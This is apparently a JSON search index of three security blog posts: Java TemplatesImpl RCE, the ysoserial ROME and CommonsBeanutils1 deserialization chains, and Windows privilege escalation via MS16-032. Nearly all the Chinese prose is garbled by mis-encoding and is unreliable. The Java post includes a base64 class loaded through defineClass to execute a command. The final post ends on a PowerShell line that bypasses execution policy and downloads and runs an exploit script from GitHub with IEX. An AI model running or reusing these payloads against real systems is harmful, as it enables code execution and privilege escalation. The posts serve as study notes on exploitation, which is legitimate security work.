[{"title":"æœ‰å…³Javaçš„å°ç‚¹","url":"/posts/b36bc80c.html","content":"\nç¢ç¢å¿µï¼šå­¦JavaçœŸçš„å¥½æŠ˜ç£¨äººå‘œå‘œå‘œå‘œï¼Œå¥½å¤šå¥½å¤šå¥½å¤šåŒ…ï¼Œåå­—ä¹Ÿä¸è®¤è¯†ï¼Œæ–¹æ³•ä¹Ÿä¸ä¼šç”¨ï¼Œåªèƒ½æ…¢æ…¢ä¸€æ­¥æ­¥å¾€å‰èµ°ï¼Œå“­å“­ğŸ˜­ï¼Œè¿™ç¯‡æ–‡ç« ä¸»è¦æ˜¯æ€»ç»“ä¸€äº›å…³äºJavaçš„æœ‰è¶£å°ç‚¹ï¼Œçœ‹ä¸ªä¹å‘µæ¶¨ç‚¹å†·çŸ¥è¯†å°±å¥½\n\n<!--more -->\n\n## å…³äºæ•°å­—çš„ç±»å‹è½¬æ¢\n\nçœ‹åˆ°è¿™ä¸ªæ˜¯å› ä¸º2022ä¸­ç§‘å¤§çš„CTFæœ‰ä¸€é“çŒœæ•°å­—çš„é¢˜ç›®ï¼Œå…³é”®ä»£ç å¦‚ä¸‹\n\n```java\npublic class test {\n    public static void main(String[] args) throws XMLStreamException {\n        double rand = éšæœºæ•°ä¸€ä¸ª;\n        var guess=Double.parseDouble(\"ç”¨æˆ·è¾“å…¥çš„æ•°æ®\");\n        var isLess = rand < guess - 1e-6 / 2;\n        var isMore = rand > guess + 1e-6 / 2;\n\t\t\t\tif(!isLess&&!isMore&&ä¸€æ¬¡çŒœå¯¹){\n          giveFlag();\n        }\n    }\n}\n```\n\nè¿™é‡Œä¼šéšæœºç”Ÿæˆä¸€ä¸ª0-1ä¹‹é—´çš„doubleç±»å‹çš„éšæœºæ•°ï¼Œç”¨æˆ·éœ€è¦çŒœå…¶ä¸­çš„éšæœºæ•°æ˜¯ä»€ä¹ˆï¼Œå¹¶ä¸”åªè¦ä¸€æ¬¡çŒœå¯¹å°±ä¼šç»™flagï¼Œå½“ç„¶é™¤éä½ è¿æ°”å·²ç»å¥½åˆ°ä¸€å®šåœ°æ­¥äº†ä¸ç„¶ç»å¯¹ä¸å¯èƒ½çŒœå‡ºæ¥çš„ï¼Œæ‰€ä»¥æˆ‘ä»¬éœ€è¦å¦è¾Ÿè¹Šå¾„äº†\n\nå¯ä»¥çœ‹åˆ°ç”¨æˆ·è¾“å…¥çš„æ•°æ®ç±»å‹æ˜¯ä»¥å­—ç¬¦ä¸²è¾“å…¥ç„¶åäº¤ç»™`parseDouble`å‡½æ•°è½¬æ¢æˆå°æ•°å†è¿›è¡Œåˆ¤æ–­çš„ï¼Œé‚£æˆ‘ä»¬è·Ÿå…¥`parseDouble`ä¸­çœ‹ä¸€ä¸‹è§£ææµç¨‹ï¼Œé€å±‚è°ƒç”¨åˆ°`FloatingDecimal.readJavaFormatString`å‡½æ•°ä¸­ï¼Œçœ‹åˆ°å¯¹ç‰¹æ®Šå†…å®¹çš„è§£æéƒ¨åˆ†\n\n![](https://jlan-blog.oss-cn-beijing.aliyuncs.com/202210241949464.png)\n\nå¯ä»¥çœ‹åˆ°æœ‰ä¸‰ç§ç‰¹æ®Šçš„è§£æç±»å‹ï¼Œåˆ†åˆ«æ˜¯NaNï¼ŒInfinityå’Œ16è¿›åˆ¶ï¼Œé‚£æˆ‘ä»¬åˆ†åˆ«ç”¨è¿™å‡ ç§è¯•è¯•çœ‹çœ‹æœ€ç»ˆæ•ˆæœ\n\n![](https://jlan-blog.oss-cn-beijing.aliyuncs.com/202210242001054.png)\n\nå¯ä»¥çœ‹åˆ°è¾“å…¥æ˜¯NaNå°±èƒ½æ‹¿åˆ°flagï¼Œæ˜¯å› ä¸ºNaNå°±åƒä¸€ä¸ªé»‘æ´ï¼Œä»»ä½•æ•°å­—å’Œä»–è¿›è¡Œè¿ç®—ç»“æœéƒ½æ˜¯NaNï¼ŒInfinityä¹Ÿç±»ä¼¼ï¼Œä¸è¿‡åœ¨*0çš„æ—¶å€™ä¼šå˜æˆNaNï¼Œåˆ¤æ–­ä¸­Infinityå¤§äºä»»ä½•æ•°ï¼Œè€ŒNaNè¡¨ç¤ºéæ•°å€¼ï¼Œæ‰€ä»¥ä¸ç®¡è¿›è¡Œä»€ä¹ˆè¿ç®—ç»“æœéƒ½ä¸ºNaNï¼Œå¸ƒå°”å€¼ä¸ºFalse\n\n## å…³äºJavaä»£ç è°ƒç”¨çš„é—®é¢˜\n\nJavaè¿™ä¸ªçƒ‚ç©æ„è®©äººå›°æƒ‘ä¸æ˜¯ä¸€å¤©ä¸¤å¤©äº†ï¼Œä»Šå¤©ç´¢æ€§æŠŠJavaä¸­çš„ä»£ç è°ƒç”¨é—®é¢˜ä¸€æ¬¡æ€§çœ‹å®Œï¼ˆè°ƒè¯•å®Œï¼‰\n\né¦–å…ˆæ˜¯staticå…³é”®å­—å®šä¹‰çš„ç±»ï¼Œæˆ‘ä»¬åœ¨ä½¿ç”¨çš„æ—¶å€™éœ€è¦ç›´æ¥å®šä¹‰ï¼Œå¦‚ä¸‹ï¼š\n\n```Java\nclassName.staticInnerClass xxx=new className.staticInnerClass()//é™æ€å†…éƒ¨ç±»åªèƒ½è®¿é—®å¤–éƒ¨é™æ€å±æ€§æˆ–æ–¹æ³•\n```\n\nå¦‚æœæ˜¯ä¸€ä¸ªéé™æ€å­ç±»ï¼Œå°±éœ€è¦å…ˆå®ä¾‹åŒ–ä¸€ä¸ªçˆ¶ç±»ï¼Œå†å®ä¾‹åŒ–å­ç±»\n\n```Java\nclassName xxx = new className();\nclassName.InnerClass inner  = xxx.new InnerClass();\n//æˆ–è€…ä¸€æ­¥åˆ°ä½\nclassName.InnerClass innerObject = new className().new InnerClass();\n```\n\n`synchronized`\n\n## å…³äºTemplatesImplåˆ©ç”¨é“¾RCEçš„é—®é¢˜\n\nå›°æƒ‘å¾ˆä¹…äº†ï¼Œä¸»è¦æ˜¯é“¾å­è·Ÿåˆ°æœ€åä¸€æ­¥ä¸çŸ¥é“æ€ä¹ˆæœ€åRCEäº†\n\nè¦æƒ³çŸ¥é“è¿™ä¸ªç±»ä¸ºä»€ä¹ˆå¯ä»¥è§¦å‘RCEï¼Œé¦–å…ˆæˆ‘ä»¬è¦çŸ¥é“é»˜è®¤æƒ…å†µä¸‹Javaæ‰§è¡Œç³»ç»Ÿå‘½ä»¤éœ€è¦ä½¿ç”¨çš„æ˜¯ä»€ä¹ˆï¼Œä»£ç åº”å½“å¦‚ä¸‹\n\n```Java\npublic class TouchFile{\n    public TouchFile() throws Exception {\n        Runtime.getRuntime().exec(\"calc\");\n    }   \n}\n```\n\nç›´æ¥ä½¿ç”¨RuntimeåŒ…ä¸­çš„å‡½æ•°æ‰§è¡Œå³å¯ï¼Œå°†è¿™ä¸ªç±»ç¼–è¯‘æˆå­—èŠ‚ç åå†è¿›è¡Œbase64ï¼Œç„¶åäº¤ç»™defineClassæ¥åŠ è½½å­—èŠ‚ç ï¼Œå†æ‰§è¡Œå…¶ä¸­\n\n```Java\nMethod defineClass = ClassLoader.class.getDeclaredMethod(\"defineClass\", String.class, byte[].class, int.class, int.class);\ndefineClass.setAccessible(true);\nbyte[] code =Base64.getDecoder().decode(\"yv66vgAAADQAHgoABgARCgASABMIABQKABIAFQcAFgcAFwEABjxpbml0PgEAAygpVgEABENvZGUBAA9MaW5lTnVtYmVyVGFibGUBAApFeGNlcHRpb25zBwAYAQAEbWFpbgEAFihbTGphdmEvbGFuZy9TdHJpbmc7KVYBAApTb3VyY2VGaWxlAQAOVG91Y2hGaWxlLmphdmEMAAcACAcAGQwAGgAbAQAEY2FsYwwAHAAdAQAJVG91Y2hGaWxlAQAQamF2YS9sYW5nL09iamVjdAEAE2phdmEvbGFuZy9FeGNlcHRpb24BABFqYXZhL2xhbmcvUnVudGltZQEACmdldFJ1bnRpbWUBABUoKUxqYXZhL2xhbmcvUnVudGltZTsBAARleGVjAQAnKExqYXZhL2xhbmcvU3RyaW5nOylMamF2YS9sYW5nL1Byb2Nlc3M7ACEABQAGAAAAAAACAAEABwAIAAIACQAAAC4AAgABAAAADiq3AAG4AAISA7YABFexAAAAAQAKAAAADgADAAAAEAAEABEADQASAAsAAAAEAAEADAAJAA0ADgACAAkAAAAmAAIAAQAAAAq4AAISA7YABFexAAAAAQAKAAAACgACAAAAFgAJABcACwAAAAQAAQAMAAEADwAAAAIAEA==\");\nClass yyds= (Class) defineClass.invoke(ClassLoader.getSystemClassLoader(), \"TouchFile\", code, 0, code.length);\nyyds.newInstance();\n```\n\næˆ‘ä»¬éƒ½çŸ¥é“ Java çš„ ClassLoader æ˜¯ç”¨æ¥åŠ è½½å­—èŠ‚ç æ–‡ä»¶æœ€åŸºç¡€çš„æ–¹æ³•ï¼ŒClassLoader æ˜¯ä»€ä¹ˆå‘¢ï¼Ÿå®ƒå°±æ˜¯ä¸€ä¸ªâ€œåŠ è½½å™¨â€ï¼Œå‘Šè¯‰Javaè™šæ‹Ÿæœºå¦‚ä½•åŠ è½½è¿™ä¸ªç±»ï¼Œç”¨ä¸€å¥è¯æ¦‚æ‹¬å®ƒçš„ä½œç”¨å°±æ˜¯å°†ä¼ å…¥çš„å­—èŠ‚ç å¤„ç†æˆçœŸæ­£çš„ Java ç±»ç„¶åè¿”å›ã€‚\n\n`ClassLoader` å¤„ç†å­—èŠ‚ç çš„æµç¨‹ä¸º `loadClass` -> `findClass` -> `defineClass`\n\n`loadClass`:ï¼šä»å·²åŠ è½½çš„ç±»ç¼“å­˜ã€çˆ¶åŠ è½½å™¨ç­‰ä½ç½®å¯»æ‰¾ç±»ï¼ˆè¿™é‡Œå®é™…ä¸Šæ˜¯åŒäº²å§”æ´¾æœºåˆ¶ï¼‰ï¼Œåœ¨å‰é¢æ²¡æœ‰æ‰¾åˆ°çš„æƒ…å†µä¸‹ï¼Œæ‰§è¡Œ `findClass` \n\n `findClass`ï¼š æ ¹æ®åŸºç¡€URLæŒ‡å®šçš„æ–¹å¼æ¥åŠ è½½ç±»çš„å­—èŠ‚ç \n\n `defineClass`ï¼šå¤„ç†å‰é¢ä¼ å…¥çš„å­—èŠ‚ç ï¼Œå°†å…¶å¤„ç†æˆçœŸæ­£çš„Javaç±»\n\næ‰€ä»¥å°†å­—èŠ‚ç è½¬ä¸º java ç±»çš„å…¶å®æ˜¯ defineClass æ–¹æ³•ï¼Œç¿»çœ‹æºç  ClassLoader#defineClass æ˜¯ä¸€ä¸ªprotectedå±æ€§ï¼Œæ— æ³•ç›´æ¥åœ¨å¤–éƒ¨è®¿é—®ï¼Œåªèƒ½é€šè¿‡åå°„çš„å½¢å¼æ¥è°ƒç”¨ï¼Œæ‰€ä»¥åœ¨å®é™…åœºæ™¯ä¸­å¾ˆéš¾åˆ©ç”¨åˆ°å®ƒã€‚\n\nè¿™ä¹Ÿå°±æ˜¯`TemplatesImpl`å­˜åœ¨çš„æ„ä¹‰ï¼Œæˆ‘ä»¬ç›´æ¥å»çœ‹è¿™ä¸ªç±»çš„å®šä¹‰\n\n![](https://jlan-blog.oss-cn-beijing.aliyuncs.com/202210232150702.png)\n\nå¯ä»¥çœ‹åˆ°TransletClassLoaderå®šä¹‰äº†defineClassæ–¹æ³•ï¼Œå¯¹å…¶è¿›è¡Œè°ƒç”¨\n\n![](https://jlan-blog.oss-cn-beijing.aliyuncs.com/202210232300218.png)\n\nå†å‘å‰æŸ¥æ‰¾å‘ç°defineTransletClassesä¸­ç”Ÿæˆäº†TransletClassLoaderå¹¶è°ƒç”¨äº†å…¶ä¸­çš„defineClassæ–¹æ³•ï¼Œä¸è¿‡åˆ°è¿™ä¸€æ­¥ä¾ç„¶æ˜¯privateå­ç±»æ— æ³•è¢«å¤–ç•Œç›´æ¥è°ƒç”¨ï¼Œæ‰€ä»¥æˆ‘ä»¬ç»§ç»­å‘ä¸Š\n\n![](https://jlan-blog.oss-cn-beijing.aliyuncs.com/202210232305532.png)\n\n![](https://jlan-blog.oss-cn-beijing.aliyuncs.com/202210232310998.png)\n\næœ€ç»ˆæ‰¾åˆ°newTransformerä¸ºpublicï¼Œå¯ä»¥ç›´æ¥è¢«è°ƒç”¨äº†ï¼Œæœ€ç»ˆåˆ©ç”¨é“¾å¦‚ä¸‹\n\n```Java\nTemplatesImpl#newTransformer() ->\nTemplatesImpl#getTransletInstance() ->\nTemplatesImpl#defineTransletClasses() ->\nTransletClassLoader#defineClass()\n```\n\n```Java\n//æœªæˆåŠŸè§¦å‘\nTemplatesImpl#getTransletIndex() -> \nTemplatesImpl#defineTransletClasses() ->\nTransletClassLoader#defineClass()\n```\n\n```Java\nTemplatesImpl#getOutputProperties() ->\nTemplatesImpl#newTransformer() -> \nTemplatesImpl#getTransletInstance() -> \nTemplatesImpl#defineTransletClasses() ->\nTransletClassLoader#defineClass() \n```\n\nçœ‹å®Œè¿™ä¸ªæˆ‘ä»¬å¯ä»¥çœ‹çœ‹ysoserialæœ€åæ˜¯æ€ä¹ˆé€šè¿‡ä»–æ„é€ å‡ºæ¥ä¸€ä¸ªå¯ä¾›å‘½ä»¤æ‰§è¡Œçš„å­—èŠ‚ç çš„\n\n"},{"title":"ysoserialååºåˆ—åŒ–","url":"/posts/7ecbecc0.html","content":"\n## ROME\n\n```java\né“¾å­\n/**\n *\n * TemplatesImpl.getOutputProperties()\n * NativeMethodAccessorImpl.invoke0(Method, Object, Object[])\n * NativeMethodAccessorImpl.invoke(Object, Object[])\n * DelegatingMethodAccessorImpl.invoke(Object, Object[])\n * Method.invoke(Object, Object...)\n * ToStringBean.toString(String)\n * ToStringBean.toString()\n * ObjectBean.toString()\n * EqualsBean.beanHashCode()\n * ObjectBean.hashCode()\n * HashMap<K,V>.hash(Object)\n * HashMap<K,V>.readObject(ObjectInputStream)\n *\n * @author mbechler\n *\n */\n```\n\næˆ‘ä»¬å…ˆè·Ÿç€ååºåˆ—åŒ–çš„é“¾å­èµ°ä¸€éè¯•è¯•\n\n![](https://jlan-blog.oss-cn-beijing.aliyuncs.com/202210211652278.png)\n\n`HashMap<K,V>.readObject(ObjectInputStream)`è¿™ä¸ªæ˜¯ååºåˆ—åŒ–çš„å…¥å£ï¼Œä¸è¿‡å¥‡æ€ªçš„æ˜¯çœ‹åˆ°å‰é¢çš„å†…å®¹å¥½åƒæ²¡æœ‰ä»€ä¹ˆå¤§ç”¨ï¼Œé‚£å°±ç›´æ¥å¾€ä¸‹è·Ÿï¼Œèµ°`hash`å‡½æ•°\n\n![](https://jlan-blog.oss-cn-beijing.aliyuncs.com/202210211655111.png)\n\n`HashMap<K,V>.hash(Object)`æ£€æŸ¥ä¼ å…¥çš„keyæ˜¯å¦ä¸ºç©ºï¼Œå¦‚æœä¸ºç©ºå°±è¿”å›0ï¼Œå¦åˆ™æ‰§è¡Œkeyçš„`hashCode`å‡½æ•°ï¼Œæ­¤å¤„keyä¸º`ObjectBean`ç±»å¯¹è±¡ï¼Œç»§ç»­èµ°`hashCode`\n\n![](https://jlan-blog.oss-cn-beijing.aliyuncs.com/202210211657876.png)\n\n`ObjectBean.hashCode()`ç»§ç»­è°ƒç”¨`EqualsBean`çš„`beanHashCode`\n\n![](https://jlan-blog.oss-cn-beijing.aliyuncs.com/202210211659382.png)\n\n`EqualsBean.beanHashCode()`ç»§ç»­è°ƒç”¨`ObjectBean`çš„`toString`æ–¹æ³•ï¼ŒhashCodeä¼šåœ¨æ¼æ´è§¦å‘åå†è¢«æ‰§è¡Œï¼Œæ‰€ä»¥æ­¤å¤„ä¸éœ€è¦ç®¡\n\n![](https://jlan-blog.oss-cn-beijing.aliyuncs.com/202210211701563.png)\n\n`ObjectBean.toString()`ç»§ç»­è°ƒç”¨`ToStringBean`çš„`toString`æ–¹æ³•\n\n![](https://jlan-blog.oss-cn-beijing.aliyuncs.com/202210211703142.png)\n\n`ToStringBean.toString()`çœ‹åˆ°æœ€åprefixå°±ç›¸å½“äºæ‹¿å‡ºæ¥è°ƒç”¨é“¾å¼€å§‹çš„åŸå¯¹è±¡çš„ç±»åï¼Œä¼ å…¥åŒåå‡½æ•°ä¸­æ‰§è¡Œ\n\n![](https://jlan-blog.oss-cn-beijing.aliyuncs.com/202210222355753.png)\n\nè¿™ä¸ªæ–¹æ³•ä¼šè°ƒç”¨ `BeanIntrospector.getPropertyDescriptors()` æ¥è·å– `_beanClass` çš„å…¨éƒ¨ getter/setter æ–¹æ³•ï¼Œç„¶ååˆ¤æ–­å‚æ•°é•¿åº¦ä¸º 0 çš„æ–¹æ³•ä½¿ç”¨ `_obj` å®ä¾‹è¿›è¡Œåå°„è°ƒç”¨ï¼Œç¿»è¯‘æˆäººè¯å°±æ˜¯ä¼šè°ƒç”¨æ‰€æœ‰ getter æ–¹æ³•æ‹¿åˆ°å…¨éƒ¨å±æ€§å€¼ï¼Œç„¶åæ‰“å°å‡ºæ¥ï¼Œæ˜¾ç„¶getteréƒ½æ˜¯æ— å‚æ–¹æ³•ï¼Œæ‰€ä»¥ä¼šå¯¼è‡´æ‰€æœ‰getteræ–¹æ³•éƒ½è¢«è°ƒç”¨äº†ä¸€é\n\n![](https://jlan-blog.oss-cn-beijing.aliyuncs.com/202210230019005.png)\n\næˆ‘ä»¬ç»§ç»­è·Ÿå…¥`Method.invoke()`ï¼Œåˆ°æœ€åè°ƒç”¨äº†`DelegatingMethodAccessorImpl.invoke(Object, Object[])`\n\n![](https://jlan-blog.oss-cn-beijing.aliyuncs.com/202210230026318.png)\n\nè·Ÿå…¥è°ƒç”¨åŒç±»ä¸‹çš„`invoke0`ï¼Œæœ€ç»ˆè§¦å‘`TemplatesImpl.getOutputProperties()`å¯¼è‡´RCE\n\n![](https://jlan-blog.oss-cn-beijing.aliyuncs.com/202210230029269.png)\n\nèµ°å®Œä¸€éé“¾å­å¤§æ¦‚çŸ¥é“æ•´ä¸ªååºåˆ—åŒ–æ˜¯æ€ä¹ˆè§¦å‘çš„äº†ï¼Œèƒ½æŒ–å‡ºæ¥çš„çœŸçš„æ˜¯ç¥ä»™ï¼ˆ\n\n## CommonsBeanutils1\n\nå—·å‘œï¼Œé¦–å…ˆè¿˜æ˜¯æ‰”ä¸€ä¸ªååºåˆ—åŒ–é“¾å­\n\n```\nPriorityQueue.readObject()\nPriorityQueue.heapify()\nPriorityQueue.siftDown()\nsiftDownUsingComparator()\nBeanComparator.compare()\nTemplatesImpl.getOutputProperties()\nTemplatesImpl.newTransformer()\nTemplatesImpl.getTransletInstance()\nTemplatesImpl.defineTransletClasses()\nTemplatesImpl.TransletClassLoader.defineClass()\n```\n\nè¿™æ¬¡æˆ‘ä»¬å¯ä»¥çœ‹åˆ°åœ¨createObjectçš„æ—¶å€™æœ€ç»ˆè¿”å›äº†ä¸€ä¸ª`PriorityQueue`ç±»å¯¹è±¡ï¼Œå…³äºè¿™ä¸ªç±»\n\n> PriorityQueueæ˜¯åŸºäºä¼˜å…ˆå †çš„ä¸€ä¸ªæ— ç•Œé˜Ÿåˆ—ï¼Œè¿™ä¸ªä¼˜å…ˆé˜Ÿåˆ—ä¸­çš„å…ƒç´ å¯ä»¥é»˜è®¤è‡ªç„¶æ’åºæˆ–è€…é€šè¿‡æä¾›çš„[Comparator](http://www.journaldev.com/780/java-comparable-and-comparator-example-to-sort-objects)ï¼ˆæ¯”è¾ƒå™¨ï¼‰åœ¨é˜Ÿåˆ—å®ä¾‹åŒ–çš„æ—¶æ’åºã€‚\n>\n> ç®€å•æ¥è¯´å°±æ˜¯ PriorityQueue ä¼šå¯¹é˜Ÿåˆ—ä¸­çš„å…ƒç´ ç”¨æ¯”è¾ƒå™¨ Comparator è¿›è¡Œæ’åºï¼Œè€Œ CommonsBeanutils1 ä¸­ä½¿ç”¨çš„æ¯”è¾ƒå™¨ä¸º BeanComparatorã€‚\n\né‚£è¿™å’Œæˆ‘ä»¬çš„ååºåˆ—åŒ–æœ‰ä»€ä¹ˆå…³ç³»å‘¢ï¼Œæˆ‘ä»¬å…ˆå¯¹è¿™ä¸ªé“¾å­è¿›è¡Œä¸€æ¬¡ååºåˆ—åŒ–è¯•è¯•\n\n![](https://jlan-blog.oss-cn-beijing.aliyuncs.com/202210260154357.png)\n\næˆ‘ä»¬å…ˆç›´æ¥æ¥çœ‹è¿™ä¸ªç±»çš„`readObject`å‡½æ•°ï¼Œçœ‹åˆ°æœ€åè°ƒç”¨äº†`heapify`***#å †åŒ–***å‡½æ•°ï¼Œæˆ‘ä»¬è·Ÿå…¥ä¸€ä¸‹\n\n![](https://jlan-blog.oss-cn-beijing.aliyuncs.com/202210260156906.png)\n\nå¯ä»¥çœ‹åˆ°å…¶ä¸­è°ƒç”¨äº†`siftDown`***#ç­›é€‰***å‡½æ•°ï¼Œæˆ‘ä»¬ç»§ç»­è·Ÿå…¥\n\n![](https://jlan-blog.oss-cn-beijing.aliyuncs.com/202210260159298.png)\n\nå…¶ä¸­è°ƒç”¨äº†`siftDownUsingComparator`***#ç”¨æ¯”è¾ƒå™¨ç­›é€‰***å‡½æ•°ï¼Œæ­¤å¤„çš„æ¯”è¾ƒå™¨ä½¿ç”¨çš„æ˜¯`BeanComparator`ï¼Œç»§ç»­è·Ÿå…¥\n\n![](https://jlan-blog.oss-cn-beijing.aliyuncs.com/202210260201908.png)\n\nè¿™é‡Œå¯¹ä¹‹å‰é˜Ÿåˆ—ä¸­çš„å†…å®¹è°ƒç”¨äº†`compare`***#æ¯”è¾ƒ***å‡½æ•°ï¼Œè·Ÿå…¥\n\n![](https://jlan-blog.oss-cn-beijing.aliyuncs.com/202210260202428.png)\n\nçœ‹åˆ°å…¶ä¸­çš„æ¯”è¾ƒå™¨å‡½æ•°å…·ä½“ä»£ç ï¼Œè·Ÿå…¥`PropertyUtils.getProperty`***#å±æ€§å·¥å…·ç±»:è·å–å±æ€§***æ–¹æ³•ï¼Œè¿™ä¸ªæ–¹æ³•å…·ä½“æ˜¯ä»€ä¹ˆå†…å®¹å‘¢\n\n> è€Œ getProperty() çš„å®šä¹‰å¦‚ä¸‹ï¼š\n>\n> `PropertyUtils.getProperty(Object bean, String name)`\n> `bean` æ˜¯ä¸ä¸ºnullçš„Java Beanå®ä¾‹\n> `name` æ˜¯Java Beanå±æ€§åç§° (ä¹Ÿå°±æ˜¯æ–¹æ³•ä¸­çš„getXxx(), setXxx(), å…¶ä¸­çš„xxxæˆä¸ºè¿™ä¸ªjava beançš„beanå±æ€§, javaä¸­çš„ç±»æˆå‘˜å˜é‡ç§°ä¸ºå­—æ®µ, å¹¶ä¸æ˜¯å±æ€§ã€‚\n> è¿™ä¸ªæ–¹æ³•æ˜¯è°ƒç”¨beanå¯¹è±¡ä¸­çš„getname()æ–¹æ³•\n\nå°±ç›¸å½“äºç›´æ¥è°ƒç”¨äº†beanå¯¹è±¡ä¸­çš„getxxx()æ–¹æ³•ï¼Œåˆå› ä¸ºååºåˆ—åŒ–æˆ‘ä»¬å¯¹å†…å®¹å¯æ§ï¼Œæˆ‘ä»¬å°±å¯ä»¥ä»»æ„è°ƒç”¨ä»»æ„å¯¹è±¡çš„ä»»æ„getæ–¹æ³•ï¼Œåœ¨è¿™é‡Œo1ï¼Œo2å°±æ˜¯æˆ‘ä»¬ååºåˆ—åŒ–ç”Ÿæˆçš„`PriorityQueue`ä¸­çš„å…ƒç´ ï¼Œè€Œ`property`å±æ€§ä¹Ÿå¯æ§ï¼Œæ‰€ä»¥æ¡ä»¶æˆç«‹ï¼Œå¯ä»¥ä»»æ„è°ƒç”¨getæ–¹æ³•\n\næ­¤å¤„æˆ‘ä»¬åªéœ€è¦æ‰¾åˆ°ä¸€ä¸ªå±é™©çš„getæ–¹æ³•å°±è¡Œäº†ï¼Œè¿˜æ˜¯ä½¿ç”¨`TemplatesImpl`ç±»ï¼Œå…³äºè¿™ä¸ªç±»RCEå¯ä»¥å»çœ‹å¦ä¸€ä¸ªJAVAå°ç‚¹æ–‡ç« ï¼Œåœ¨æ­¤ä¸å†èµ˜è¿°\n\næœ€åæˆ‘ä»¬å†å›æ¥çœ‹ysoserialä¸­å¯¹è¿™æ¡é“¾çš„åˆ©ç”¨ä»£ç \n\n![](https://jlan-blog.oss-cn-beijing.aliyuncs.com/202210260214643.png)\n\nè±ç„¶å¼€æœ—å–µå–µ\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\næ–‡ç« å¼•ç”¨ï¼š\n\nhttps://blog.csdn.net/solitudi/article/details/119082164\n\nhttps://www.anquanke.com/post/id/247434\n"},{"title":"Windowså†…ç½‘åŸŸæ¸—é€ ææƒ","url":"/posts/e80ed6fe.html","content":"\n# ä½æƒé™å¯»æ‰¾ææƒæ‰‹æ®µ\n\nå¸¸è§çš„ææƒæ‰‹æ®µï¼š\n\n1ã€æœ¬åœ°æº¢å‡ºæ¼æ´\n\n2ã€æ•°æ®åº“ææƒ\n\n3ã€ç¬¬ä¸‰æ–¹è½¯ä»¶ææƒ\n\næƒ³è¦ææƒæˆ‘ä»¬å°±éœ€è¦å…ˆäº†è§£è¿™å°ç”µè„‘ä¸Šé¢ç©¶ç«Ÿæœ‰ä»€ä¹ˆæ¼æ´å¯ä¾›æˆ‘ä»¬åˆ©ç”¨ï¼Œæ‰€ä»¥ç¬¬ä¸€ä»¶äº‹è¿˜æ˜¯é€šè¿‡ä¿¡æ¯æ”¶é›†æ¥æ‰¾åˆ°æˆ‘ä»¬å¯ä»¥åˆ©ç”¨çš„æ¼æ´ï¼Œè¿™é‡Œæœ‰ä¸€äº›å¯ä»¥å¸®åŠ©æˆ‘ä»¬çš„è„šæœ¬\n\n## å¯»æ‰¾ææƒæ¼æ´\n\n### Windows Exploit Suggester - Next Generation (WES-NG)\n\n[è„šæœ¬é“¾æ¥](https://github.com/bitsadmin/wesng)\n\nè¿™ä¸ªè„šæœ¬å¯ä»¥é€šè¿‡è®¡ç®—æœºçš„ç³»ç»Ÿä¿¡æ¯æ¥çœ‹åˆ°ç”µè„‘çš„è¡¥ä¸ä¿¡æ¯ï¼Œè¿›è€Œæ¨æ–­å‡ºå½“å‰æœºå™¨å¯è¢«åˆ©ç”¨çš„æ¼æ´\n\nè·å–ä¿¡æ¯çš„æ–¹å¼æœ‰ä¸‰ç§\n\n> There are two options to check for missing patches: a. Launch `missingkbs.vbs` on the host to have Windows determine which patches are missing b. Use Windows' built-in `systeminfo.exe` tool to obtain the system information of the local system, or from a remote system using `systeminfo /S MyRemoteHost`, and redirect this to a file: `systeminfo > systeminfo.txt`\n>\n> æœ‰ä¸¤ä¸ªé€‰é¡¹å¯ä»¥æ£€æŸ¥ç¼ºå¤±çš„è¡¥ä¸ï¼šåœ¨ä¸»æœºä¸Šå¯åŠ¨`missingkbs.vbs`ï¼Œè®© Windows ç¡®å®šç¼ºå°‘å“ªäº›è¡¥ä¸ b.ä½¿ç”¨Windowså†…ç½®çš„`systeminfo.exe`å·¥å…·è·å–æœ¬åœ°ç³»ç»Ÿçš„ç³»ç»Ÿä¿¡æ¯ï¼Œæˆ–è€…ä½¿ç”¨`systeminfo /S MyRemoteHost`ä»è¿œç¨‹ç³»ç»Ÿè·å–ç³»ç»Ÿä¿¡æ¯ï¼Œå¹¶å°†å…¶é‡å®šå‘åˆ°ä¸€ä¸ªæ–‡ä»¶ï¼š`systeminfo > systeminfo.txt`\n\nè·å–åˆ°çš„ä¿¡æ¯æ”¾åˆ°æ–‡ä»¶ä¸­ä¼ å…¥è„šæœ¬æ‰§è¡Œå³å¯çœ‹åˆ°ç»“æœ\n\n![](https://jlan-blog.oss-cn-beijing.aliyuncs.com/202210202009074.png)\n\n## ææƒè„šæœ¬å¤§å…¨\n\n\n\n\n\n\n\n\n\n\n\n### æº¢å‡ºæ¼æ´ææƒ\n\n#### MS16-032ææƒ\n\né€šè¿‡è¿™ä¸ªæ¼æ´æˆ‘ä»¬å¯ä»¥ä»¥ä¸€ä¸ªæ™®é€šç”¨æˆ·èº«ä»½ï¼Œæ¥æ·»åŠ ä¸€ä¸ªadministratorç®¡ç†å‘˜ç»„çš„ç”¨æˆ·ï¼Œè¿˜èƒ½ä»¥SYSTEMæƒé™æ¥è¿è¡Œç¨‹åº\n\næ¼æ´å‰æï¼šç›®æ ‡ç³»ç»Ÿéœ€è¦æœ‰2ä¸ªä»¥ä¸Šçš„CPUæ ¸å¿ƒï¼Œå¹¶ä¸”PowerShellæ˜¯2.0ä»¥ä¸Šçš„ç‰ˆæœ¬\n\næ­¤æ¼æ´å½±å“Windows Vistaåˆ°Windows10ä¹‹é—´çš„æ‰€æœ‰æœªä¿®å¤è®¾å¤‡\n\né¦–å…ˆæ‰¾åˆ°å¯¹åº”çš„[ææƒè„šæœ¬](https://raw.githubusercontent.com/Ridter/Pentest/master/powershell/MyShell/Invoke-MS16-032.ps1)ï¼ŒæŒ‰æ•™ç¨‹æ¥è¯´ç›´æ¥è¿è¡Œå°±å¥½ï¼Œä½†æ˜¯æˆ‘æœ¬æœºç¯å¢ƒå°è¯•äº†å¥½å¤šééƒ½æ²¡æœ‰ååº”ï¼Œæ‰“å¼€æŠ¥é”™åå‘ç°æ˜¯å› ä¸ºåŸå§‹çŠ¶æ€ä¸‹é™åˆ¶äº†powershellæ‰§è¡Œè„šæœ¬ï¼Œåœ¨æˆ‘æƒ³å¦‚ä½•ä¸ä½¿ç”¨ç®¡ç†å‘˜æƒé™ä¿®æ”¹powershellæ§åˆ¶æ—¶ï¼Œå‘ç°äº†å¦ä¸€ç§æ‰§è¡Œè„šæœ¬çš„æ–¹æ³•\n\n```cmd\npowershell -nop -exec bypass -c \"IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/Ridter/Pentest/master/powershell/MyShell/Invoke-MS16-032.ps1');Invoke-MS16-032 -Application cmd.exe -commandline 